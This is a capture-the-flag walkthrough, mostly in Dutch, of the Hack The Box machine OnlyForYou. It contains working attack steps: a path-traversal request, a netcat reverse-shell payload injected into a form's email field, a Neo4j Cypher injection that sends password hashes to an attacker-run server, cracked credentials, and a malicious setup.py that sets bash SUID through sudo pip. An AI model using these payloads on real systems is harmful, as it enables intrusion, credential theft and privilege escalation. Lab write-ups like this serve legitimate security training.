# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/OnlyForYou]
└─$ nmap 10.129.134.171                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 13:24 CEST
Nmap scan report for 10.129.134.171
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the host

```
┌──(kali㉿kali)-[~/HTB/OnlyForYou]
└─$ nmap -p22,80 -sCV 10.129.134.171  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 13:25 CEST
Nmap scan report for 10.129.134.171
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

FQDN toegevoegd aan de hosts file. Ik ben eens gaan kijken naar de webapplicatie wat er allemaal op te vinden is. Maar zoals je zelf zult kunnen zien is er niet veel dat we kunnen doen op de website. Ik ben hiervoor dus gaan kijken of er geen subdirectory gekent is. Dit ben ik gaan doen door gebruik te maken van de FFUF tool. En zoals je hieronder zult kunnen zien hebben we de subdirectory 'beta' gevonden.

```
┌──(kali㉿kali)-[~/HTB/OnlyForYou]
└─$ ffuf -u http://only4you.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "Host:FUZZ.only4you.htb" -ac    

 :: Method           : GET
 :: URL              : http://only4you.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Header           : Host: FUZZ.only4you.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

beta                    [Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 41ms]
Beta                    [Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 29ms]
BETA                    [Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 24ms]
:: Progress: [29999/29999] :: Job [1/1] :: 2000 req/sec :: Duration: [0:00:15] :: Errors: 1 ::
```

Ik zal deze gaan toevoegen aan de hosts file en zal ik eens gaan kijken wat we op de beta webapplicatie kunnen vinden.

![[Pasted image 20250905133550.png]]

Zoals je hierboven kunt zien kan je de Source Code downloaden. Binnen de source.zip file kan je de volgende bestanden vinden.

```
┌──(kali㉿kali)-[~/HTB/OnlyForYou/beta]
└─$ ls -a
.  ..  app.py  static  templates  tool.py  uploads
```

Ik ben als eerst gaan kijken op de beta website maar daar kan je niet veel doen buiten naar de list van de jpg's / png's gaan maar je kan ze niet downloaden. Je kan ook naar de resize en de convert gaan, maar zelf hiermee zijn we niet veel. Ik ben dus de app.py python file gaan runnen en hiermee wordt er een localhost op poort 80 gerunned. Dit is de local server. De applicatie draait op een python web framework flask.

Ik ben eens gaan kijken in de tool.py file en heb daar gezien dat de `join` functie van de os.path vulnerable is aan directory traversal attack.

```
imgpath = os.path.join
```

Ik ben als eerst dus een path traversal gaan proberen doen maar zoals je kan zien kwam er geen data tevoorschijn op mijn scherm. Ik ben eens gaan nakijken hoe dat ik dit kon oplossen en ben op de solutie gekomen dat ik gewoon het path neem zonder `../../` krijg ik wel het path te zien. Dit kan je zien door de test die ik uitgevoerd heb hieronder.

```
┌──(kali㉿kali)-[~/HTB/OnlyForYou/beta]
└─$ python3       
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
>>> import os, uuid, posixpath
>>> filename = posixpath.normpath('../../../../../clean.jpg')
>>> print(filename)
../../../../../clean.jpg
>>> filename = posixpath.normpath('/../../../../../clean.jpg')
>>> print(filename)
/clean.jpg
>>> filename = posixpath.normpath('/clean.jpg')
>>> print(filename)
/clean.jpg
```

Als ik dit dus nu ga verwerken in mijn brup commando zal je kunnen zien dat ik de passwd file van de server te zien krijg.

```
Request

POST /download HTTP/1.1

Host: 127.0.0.1
image=/etc/passwd

Respond

HTTP/1.1 200 OK  
Server: nginx/1.18.0 (Ubuntu)  
Date: Tue, 18 Nov 2025 10:08:31 GMT  
Content-Type: application/octet-stream  
Content-Length: 2079  
Connection: keep-alive  
Content-Disposition: attachment; filename=passwd  
Last-Modified: Thu, 30 Mar 2023 12:12:20 GMT  
Cache-Control: no-cache  
ETag: "1680178340.2049809-2079-393413677"

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin  
syslog:x:104:110::/home/syslog:/usr/sbin/nologin  
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin  
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false  
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin  
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin  
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin  
pollinate:x:110:1::/var/cache/pollinate:/bin/false  
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin  
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
john:x:1000:1000:john:/home/john:/bin/bash  
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false  
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false  
neo4j:x:997:997::/var/lib/neo4j:/bin/bash  
dev:x:1001:1001::/home/dev:/bin/bash  
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin  
_laurel:x:996:996::/var/log/laurel:/bin/false
```

conf file van de nginx server gaan bekijken

```
**Request**

POST /download HTTP/1.1  
Host: beta.only4you.htb  
Content-Length: 27  
Cache-Control: max-age=0  
Accept-Language: en-US,en;q=0.9  
Origin: [http://beta.only4you.htb](http://beta.only4you.htb "http://beta.only4you.htb/")  
Content-Type: application/x-www-form-urlencoded  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Referer: [http://beta.only4you.htb/list](http://beta.only4you.htb/list "http://beta.only4you.htb/list")  
Accept-Encoding: gzip, deflate, br  
Connection: keep-alive

image=/etc/nginx/nginx.conf

**Response**

HTTP/1.1 200 OK  
Server: nginx/1.18.0 (Ubuntu)  
Date: Tue, 18 Nov 2025 10:12:03 GMT  
Content-Type: application/octet-stream  
Content-Length: 1490  
Connection: keep-alive  
Content-Disposition: attachment; filename=nginx.conf  
Last-Modified: Mon, 04 Feb 2019 15:52:23 GMT  
Cache-Control: no-cache  
ETag: "1549295543.0-1490-1416431590"

user www-data;  
worker_processes auto;  
pid /run/nginx.pid;  
include /etc/nginx/modules-enabled/*.conf;

events {  
  worker_connections 768;  
  # multi_accept on;  
}

http {

  ##  
  # Basic Settings  
  ##

  sendfile on;  
  tcp_nopush on;  
  tcp_nodelay on;  
  keepalive_timeout 65;  
  types_hash_max_size 2048;  
  # server_tokens off;

  # server_names_hash_bucket_size 64;  
  # server_name_in_redirect off;

  include /etc/nginx/mime.types;  
  default_type application/octet-stream;

  ##  
  # SSL Settings  
  ##

  ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE  
  ssl_prefer_server_ciphers on;

  ##  
  # Logging Settings  
  ##

  access_log /var/log/nginx/access.log;  
  error_log /var/log/nginx/error.log;

  ##  
  # Gzip Settings  
  ##

  gzip on;

  # gzip_vary on;  
  # gzip_proxied any;  
  # gzip_comp_level 6;  
  # gzip_buffers 16 8k;  
  # gzip_http_version 1.1;  
  # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

  ##  
  # Virtual Host Configs  
  ##

  include /etc/nginx/conf.d/*.conf;  
  include /etc/nginx/sites-enabled/*;  
}

#mail {  
#  # See sample authentication script at:  
#  # [http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript](http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript "http://wiki.nginx.org/imapauthenticatewithapachephpscript")  
#   
#  # auth_http localhost/auth.php;  
#  # pop3_capabilities "TOP" "USER";  
#  # imap_capabilities "IMAP4rev1" "UIDPLUS";  
#   
#  server {  
#    listen     localhost:110;  
#    protocol   pop3;  
#    proxy      on;  
#  }  
#   
#  server {  
#    listen     localhost:143;  
#    protocol   imap;  
#    proxy      on;  
#  }  
#}
```

Als we gaan kijken naar de file `app.py` heb je de functie sendmessage die wordt aangeroepen vanuit de import functie form. Meestal de van de import functie heb je de file dan. Zoals in dit geval `form.py`. dus ik ben eens gaan kijken in die file.

```
**Request**

POST /download HTTP/1.1  
Host: beta.only4you.htb  
Content-Length: 35  
Cache-Control: max-age=0  
Accept-Language: en-US,en;q=0.9  
Origin: [http://beta.only4you.htb](http://beta.only4you.htb "http://beta.only4you.htb/")  
Content-Type: application/x-www-form-urlencoded  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Referer: [http://beta.only4you.htb/list](http://beta.only4you.htb/list "http://beta.only4you.htb/list")  
Accept-Encoding: gzip, deflate, br  
Connection: keep-alive

image=/var/www/only4you.htb/form.py

**Response**

HTTP/1.1 200 OK  
Server: nginx/1.18.0 (Ubuntu)  
Date: Tue, 18 Nov 2025 10:54:19 GMT  
Content-Type: text/x-python; charset=utf-8  
Content-Length: 2025  
Connection: keep-alive  
Content-Disposition: attachment; filename=form.py  
Last-Modified: Mon, 31 Oct 2022 17:25:34 GMT  
Cache-Control: no-cache  
ETag: "1667237134.0-2025-2730756853"

import smtplib, re  
from email.message import EmailMessage  
from subprocess import PIPE, run  
import ipaddress

def issecure(email, ip):  
  if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):  
    return 0  
  else:  
    domain = email.split("@", 1)[1]  
    result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)  
    output = result.stdout.decode('utf-8')  
    if "v=spf1" not in output:  
      return 1  
    else:  
      domains = []  
      ips = []  
      if "include:" in output:  
        dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")  
        dms.pop(0)  
        for domain in dms:  
          domains.append(domain)  
        while True:  
          for domain in domains:  
            result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)  
            output = result.stdout.decode('utf-8')  
            if "include:" in output:  
              dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")  
              domains.clear()  
              for domain in dms:  
                domains.append(domain)  
            elif "ip4:" in output:  
              ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")  
              ipaddresses.pop(0)  
              for i in ipaddresses:  
                ips.append(i)  
            else:  
              pass  
          break  
      elif "ip4" in output:  
        ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")  
        ipaddresses.pop(0)  
        for i in ipaddresses:  
          ips.append(i)  
      else:  
        return 1  
    for i in ips:  
      if ip == i:  
        return 2  
      elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):  
        return 2  
      else:  
        return 1

def sendmessage(email, subject, message, ip):  
  status = issecure(email, ip)  
  if status == 2:  
    msg = EmailMessage()  
    msg['From'] = f'{email}'  
    msg['To'] = 'info@only4you.htb'  
    msg['Subject'] = f'{subject}'  
    msg['Message'] = f'{message}'

    smtp = smtplib.SMTP(host='localhost', port=25)  
    smtp.send_message(msg)  
    smtp.quit()  
    return status  
  elif status == 1:  
    return status  
  else:  
    return status
```

Hier kan je zien dat de re.match functie een grote rol gaat spelen voor de rce te doen naar de webserver. https://docs.python.org/3/library/re.html

![[Pasted image 20251119110254.png]]

Voor de rce code optezetten zullen we dit gaan doen door gebruik te maken van de contact forum op de website. Hier gaan we binnen de email box de rce commando gaan meegeven. we gaan hierbij een listener opstarten en zal je kunnen zien dat we de connect tot de user `www-data` hebben.

```
Request

POST / HTTP/1.1

Host: only4you.htb

name=test&email=test%40only4you.htb;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.11+4444+>/tmp/f&subject=test&message=test

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                                                                                             
Listening on 0.0.0.0 4444
Connection received on 10.129.47.37 56294
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@only4you:~/only4you.htb$ 
```

Ik ben nu linpeas gaan installeren op de machine en daar bij heb ik gezien dat de volgende poorten openstaan.

```
╔══════════╣ Active Ports  
╚ [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports")  
══╣ Active Ports (netstat)  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                     
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1029/nginx: worker    
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -                     
tcp6       0      0 :::22                   :::*                    LISTEN      -                     
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -
```

Kzal nu een tunnel gaan opzetten door gebruik te maken van chisel. Chisel is a fast TCP/UDP tunnel, transported over HTTP and secured via SSH. It is particularly useful for penetration testers when dealing with restrictive networks or for creating reverse tunnels during assessments. In this blog post, we will walk through leveraging Chisel to establish tunnels and SOCKS proxies in pentesting scenarios using specific configurations.

Chisel is a single binary, cross-platform tool that can work as both a client and a server, offering:
- Port forwarding (local and reverse)
- SOCKS proxies for network traversal
- Encrypted communication for stealthy operations.

On kali machine

```
┌──(kali㉿kali)-[~/HTB/OnlyForYou]
└─$ chisel server -p 8002 --reverse 
2025/11/19 16:59:08 server: Reverse tunnelling enabled
2025/11/19 16:59:08 server: Fingerprint DnlYSTFvn8nPOciYnKsiRaqxZsQ6Lw+YndGFX1bYIf4=
2025/11/19 16:59:08 server: Listening on http://0.0.0.0:8002
2025/11/19 16:59:09 server: session#1: tun: proxy#R:3000=>3000: Listening
2025/11/19 17:01:09 server: session#2: tun: proxy#R:8001=>8001: Listening
2025/11/19 17:01:09 server: session#2: tun: proxy#R:33060=>33060: Listening
2025/11/19 17:01:09 server: session#2: tun: proxy#R:3306=>3306: Listening
```

Op de server

```
./chisel client 10.10.16.11:8002 R:8001:127.0.0.1:8001 R:33060:127.0.0.1:33060 R:3306:127.0.0.1:3306
2025/11/19 11:14:22 client: Connecting to ws://10.10.16.11:8002
2025/11/19 11:14:23 client: Connected (Latency 16.685208ms)
```

Ik ben alle tcp connectie gaan opzetten, hierbij ben ik gaan kijken naar elke connectie. Zoals je zult kunnen zien zullen we niets op poort 3306 en poort 33060 te zien krijgen. 
On port 3000, we can find Gogs installed which is self-hosted Git service. When trying to login with default credentials, I was not successful.

Ik ben dus gaan kijken naar de port 8001 en daar kan je de only4you.htb login pagina vinden. Daar ben ik gaan proberen inloggen door gewoon admin username en password te gebruiken.

![[Pasted image 20251119121855.png]]
Nu komen we op de volgende pagina terecht.

![[Pasted image 20251119121922.png]]

Zoals je in de tasks zult kunnen zien is de data die hier in geprovid wordt van de neo4j database. Deze zullen we ook moeten gaan opzetten door poort 7474 optezetten.

```
./chisel client 10.10.16.11:8002 R:7474:127.0.0.1:7474 R:80:127.0.0.1:80

┌──(kali㉿kali)-[~/HTB/OnlyForYou]
└─$ chisel server -p 8002 --reverse 
2025/11/19 16:59:08 server: Reverse tunnelling enabled
2025/11/19 16:59:08 server: Fingerprint DnlYSTFvn8nPOciYnKsiRaqxZsQ6Lw+YndGFX1bYIf4=
2025/11/19 16:59:08 server: Listening on http://0.0.0.0:8002
2025/11/19 16:59:09 server: session#1: tun: proxy#R:3000=>3000: Listening
2025/11/19 17:01:09 server: session#2: tun: proxy#R:8001=>8001: Listening
2025/11/19 17:01:09 server: session#2: tun: proxy#R:33060=>33060: Listening
2025/11/19 17:01:09 server: session#2: tun: proxy#R:3306=>3306: Listening
2025/11/19 17:13:50 server: session#3: tun: proxy#R:7474=>7474: Listening
2025/11/19 17:13:50 server: session#3: tun: proxy#R:80=>80: Listening
```

Zoals je nu kunt zien zijn we op de neo4j database pagina.

![[Pasted image 20251119122947.png]]
Maar nergens kon ik de usercredentials vinden dus ben ik een exploit gaan opzoeken. Hiervoor heb ik de volgende exploit gevonden. www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits

![[Pasted image 20251119124620.png]]

```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.11:8003/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8003
Serving HTTP on 0.0.0.0 port 8003 (http://0.0.0.0:8003/) ...
10.129.47.37 - - [19/Nov/2025 17:28:40] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.47.37 - - [19/Nov/2025 17:28:40] "GET /?username=admin HTTP/1.1" 200 -
10.129.47.37 - - [19/Nov/2025 17:28:41] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.47.37 - - [19/Nov/2025 17:28:41] "GET /?username=john HTTP/1.1" 200 -
10.129.47.37 - - [19/Nov/2025 17:28:41] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.47.37 - - [19/Nov/2025 17:28:41] "GET /?username=admin HTTP/1.1" 200 -
10.129.47.37 - - [19/Nov/2025 17:28:42] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.47.37 - - [19/Nov/2025 17:28:42] "GET /?username=john HTTP/1.1" 200 -

```

Hierbij hebben we de hashes voor de user admin en john gekregen. Ik ben deze gaan cracken door gebruik te maken van crackstation.

| Username | Password   |
| -------- | ---------- |
| admin    | admin      |
| john     | ThisIs4You |
Ik ben nu gaan inloggen op de ssh server met de user john.

```
┌──(kali㉿kali)-[~]
└─$ ssh john@only4you.htb    

john@only4you:~$ 
john@only4you:~$ cat user.txt 
254b81e31472fb12abb3fa787eb874c9
```


Nu ben ik gaan kijken op de gogs webpagina en daar kan je zien dat ik ben gaan inloggen door gebruik te maken van de user credentials van John.

![[Pasted image 20251119143015.png]]

Als we hier nu naar de explore tab gaan dan kan je zien dat de user administrator en john gekent zijn.
volg de url voor de malicious .tar.gz folder aan te maken
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download/

```
┌──(kali㉿kali)-[~/HTB/OnlyForYou/exploit]
└─$ cat setup.py 
# setup..py
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
 # Arbitrary code here!
 import os;os.system("chmod u+s /usr/bin/bash")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "exploit",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)


┌──(kali㉿kali)-[~/HTB/OnlyForYou/exploit]
└─$ sudo python3 -m build
```

We gaan een nieuwe repo aanmaken en daarin zal je de .tar.gz file moeten aanmaken zodat je deze daarna op de server kunt gaan downloaden.

![[Pasted image 20251119153816.png]]


![[Pasted image 20251119153757.png]]
```
john@only4you:~$ sudo /usr/bin/pip3 download http\://127.0.0.1\:3000/john/admincode/raw/master/exploit-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/admincode/raw/master/exploit-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/admincode/raw/master/exploit-0.0.1.tar.gz (1.1 kB)
  Saved ./exploit-0.0.1.tar.gz
Successfully downloaded exploit

```

```
john@only4you:~$ /bin/bash -p
bash-5.0# id
uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)
bash-5.0# cd ..
bash-5.0# ls
dev  john
bash-5.0# cd ..
bash-5.0# ls
bin   dev  home  lib32  libx32      mnt  proc  run   srv  tmp  var
boot  etc  lib   lib64  lost+found  opt  root  sbin  sys  usr
bash-5.0# cd root
bash-5.0# ls
root.txt  scripts
bash-5.0# cat root.txt
a6d813e3819bb42bbc0e3fb3c91b0e73

```

![[Pasted image 20251119153634.png]]